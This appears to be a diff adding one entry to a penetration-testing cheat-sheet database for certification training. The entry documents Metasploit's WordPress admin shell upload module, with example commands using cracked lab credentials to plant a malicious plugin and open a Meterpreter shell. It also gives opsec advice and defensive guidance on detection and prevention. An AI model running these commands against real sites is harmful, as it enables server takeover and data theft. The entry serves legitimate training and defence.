@@ -1,0 +1,103 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "metasploit"
+  ],
+  "tags": [
+    "wordpress",
+    "metasploit",
+    "rce"
+  ],
+  "category": "Exploitation",
+  "subcategory": "WordPress",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Set the cracked admin username",
+      "command": "set username john"
+    },
+    {
+      "label": "Set the cracked password",
+      "command": "set password firebird1"
+    },
+    {
+      "label": "Target host IP",
+      "command": "set rhost 10.129.42.195"
+    },
+    {
+      "label": "Set the WordPress vhost",
+      "command": "set VHOST blog.inlanefreight.local"
+    },
+    {
+      "label": "Upload the malicious plugin and pop a Meterpreter shell",
+      "command": "exploit"
+    }
+  ],
+  "notes": "Convenient but noisy - it writes a plugin to disk and leaves an obvious artifact. If AV/logging is a concern, prefer the manual theme-editor webshell.",
+  "references": [
+    {
+      "title": "Metasploit Framework",
+      "url": "https://www.metasploit.com/"
+    },
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "wpscan-bruteforce",
+      "note": "Provides the admin credentials this module needs.",
+      "rel": "prereq"
+    },
+    {
+      "id": "wp-theme-webshell",
+      "note": "Manual equivalent via the theme editor.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "wp-admin-shell-msf",
+  "name": "WordPress - Admin Shell Upload (Metasploit)",
+  "command": "use exploit/unix/webapp/wp_admin_shell_upload",
+  "description": "Metasploit module that uses valid admin credentials to upload a malicious plugin and get a shell. Set username/password/rhost/vhost/lhost then exploit.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190",
+    "T1505.003"
+  ],
+  "exam": "msf-one-machine",
+  "defense": {
+    "why_it_works": "Metasploit's wp_admin_shell_upload module authenticates to WordPress with admin credentials, generates a malicious plugin containing a PHP Meterpreter stager, uploads it via the plugin installation API, and activates it — triggering the payload.",
+    "prerequisites": "Valid WordPress admin credentials. Plugin installation enabled (default). Network access from MSF host to WordPress.",
+    "impact": "Full Meterpreter session on the web server as www-data. Enables post-exploitation: hashdump, lateral movement, file access, persistence.",
+    "detection": "WordPress audit log: new plugin installed and activated by admin. New directory in /wp-content/plugins/ with random name. Outbound TCP from web server to attacker IP. WordFence new plugin alert.",
+    "artifacts": "WordPress audit log (plugin installed/activated) | File system: /wp-content/plugins/<random>/ | Meterpreter TCP session in network traffic | WordFence plugin change notification",
+    "prevention": "Disable plugin installation: define('DISALLOW_FILE_MODS', true). Require MFA for admin login. Monitor and alert on new plugin installations.",
+    "misconfiguration": "WordPress allows plugin installation by admin. DISALLOW_FILE_MODS not set. No file-change monitoring on /wp-content/plugins/.",
+    "vulnerable_config": "# wp-config.php default -- no restriction\n# Plugin installation enabled for admin\n# /wp-content/plugins/ writable by www-data",
+    "secure_config": "# wp-config.php\ndefine('DISALLOW_FILE_MODS', true);\ndefine('DISALLOW_FILE_EDIT', true);\n\n# Monitor with inotifywait or WordFence file integrity monitor",
+    "sources": [
+      "HTB M24",
+      "MITRE T1190",
+      "MITRE T1505.003",
+      "OWASP A04:2021"
+    ]
+  }
+}
